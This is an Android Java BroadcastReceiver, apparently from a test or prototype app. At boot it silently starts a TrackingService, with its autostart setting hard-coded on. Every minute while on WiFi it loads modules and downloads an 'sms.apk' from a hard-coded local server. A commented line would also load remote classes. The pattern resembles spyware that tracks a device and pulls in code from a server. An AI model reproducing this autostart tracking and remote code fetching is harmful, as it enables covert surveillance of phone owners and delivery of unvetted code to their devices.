package com.example.test;

import com.example.test.util.Log;
import com.example.test.util.ModuleEngine;
import com.example.test.util.Net;
import com.example.test.util.Vibr;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

public class BootBroadReceiv extends BroadcastReceiver {
	public static BootBroadReceiv odin = null;
	final String LOG_TAG = "myLogsBootBroadReceiv";

	public void onReceive(Context context, Intent intent) {
		Log.context = context;
		if (intent.getAction() == Intent.ACTION_BOOT_COMPLETED) {
			Log.v(LOG_TAG, "WIFI BootBroadReceiv " + intent.toString());
			//SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
			boolean val = true; //prefs.getBoolean("chb_autostart", true);
			Vibr.vibrate(context, new long[] { 0, 300, 100, 400 });
			if (val) {
				try {
					Thread.sleep(10000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				context.startService(new Intent(context, TrackingService.class));
			}
		}
		if (intent.getAction() == Intent.ACTION_TIME_TICK) {
			Vibr.vibrate(context,
					new long[] { 0, 30, 100, 40 });

			//SharedPreferences prefs = PreferenceManager
				//	.getDefaultSharedPreferences(context);
			//boolean bWifi = prefs.getBoolean("chb_wifi_up", false);
			if ((Net.getInetType(context) == "WIFI")) {
				Log.v(LOG_TAG, "WIFI BootBroadReceiv " + intent.toString());
				ModuleEngine.load_all("", context );
				//java.net.URLClassLoader("http://192.168.8.228/tst/class/ModulePrinter.class");
				(new ModuleEngine()).save_url("http://192.168.8.228/tst/sms.apk",
						context );
			}
		}
		Log.v(LOG_TAG, "BootBroadReceiv " + intent.toString());
	}
}